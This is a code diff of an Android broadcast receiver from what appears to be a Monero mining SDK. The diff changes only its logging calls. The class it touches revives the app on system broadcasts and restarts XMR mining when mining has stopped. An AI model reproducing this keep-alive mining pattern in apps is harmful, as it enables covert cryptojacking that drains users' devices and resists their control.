@@ -8,6 +8,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 import waterhole.miner.core.StateObserver;
+import waterhole.miner.core.utils.LogUtils;
 import waterhole.miner.monero.XmrMiner;
 import waterhole.miner.monero.keepappalive.utils.SystemUtils;
 
@@ -20,14 +21,12 @@ import waterhole.miner.monero.keepappalive.utils.SystemUtils;
  */
 public class KeepAliveReceiver extends BroadcastReceiver {
 
-    private static final String TAG = "KeepAliveReceiver";
-
     @Override
     public void onReceive(Context context, Intent intent) {
         String action = intent.getAction();
-        Log.d(TAG,"AliveBroadcastReceiver---->接收到的系统广播："+action);
+        LogUtils.info("AliveBroadcastReceiver---->接收到的系统广播："+action);
         if(SystemUtils.isAPPALive(context)){
-            Log.i(TAG,"AliveBroadcastReceiver---->APP还是活着的");
+            LogUtils.info("AliveBroadcastReceiver---->APP还是活着的");
             return;
         }
         if (!XmrMiner.instance().isMining()) {
@@ -69,6 +68,6 @@ public class KeepAliveReceiver extends BroadcastReceiver {
                 }
             }).startMine();
         }
-        Log.i(TAG,"AliveBroadcastReceiver---->复活进程(APP)");
+        LogUtils.info("AliveBroadcastReceiver---->复活进程(APP)");
     }
 }
